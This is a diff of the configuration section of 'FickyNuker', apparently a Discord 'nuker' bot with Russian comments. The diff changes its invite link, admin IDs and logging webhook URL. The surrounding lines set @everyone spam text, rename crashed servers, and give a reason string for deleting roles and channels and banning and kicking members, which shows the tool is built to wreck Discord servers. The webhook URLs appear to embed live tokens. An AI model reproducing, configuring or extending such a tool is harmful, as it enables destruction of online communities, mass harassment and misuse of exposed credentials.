@@ -38,11 +38,11 @@ namen = 'Crashed By Fickynuker'#имя сервера при краше
 iconn = 'icon.PNG' # не трогайте лучше
 hooknamen = 'Crashed By Fickynuker'#имя хуков
 botnamen = 'FickyNuker'#тип имя бота
-inviten = 'https://discord.gg/XeeP5Hj7kc' # тут ссылка на ваш сервер
+inviten = 'https://discord.gg/qfhBmtbGTU' # тут ссылка на ваш сервер
 spamtextn = f'@everyone\nДанный сервер крашиться ботом FickyNuker\nСервер поддержки: {inviten}'
-admins = [797358493317333022] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
+admins = [926602677113204736] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
 reasonn = 'Crash by FickyNuker' # причина удаления ролей,каналов, бана и кика участников
-loghook = 'https://discord.com/api/webhooks/936615554448502825/PaCKk0Rm6XfCOq4p0rbEWTQHmD_XfCZW5a5T0yTQoICj0sofTbd5ENiJg8OEOoArleVx'# ссылка на вебхук с логами
+loghook = 'https://discord.com/api/webhooks/981266918239522867/mVnGymwB1Q__oNzady0PObttRT5N2Ckc3WISpo9yObDZJj-m1ASL_zFKjqkJUx60oF6n'# ссылка на вебхук с логами
 
 # включаем интенты и создаем переменную бота (client)
 intents = discord.Intents.default()
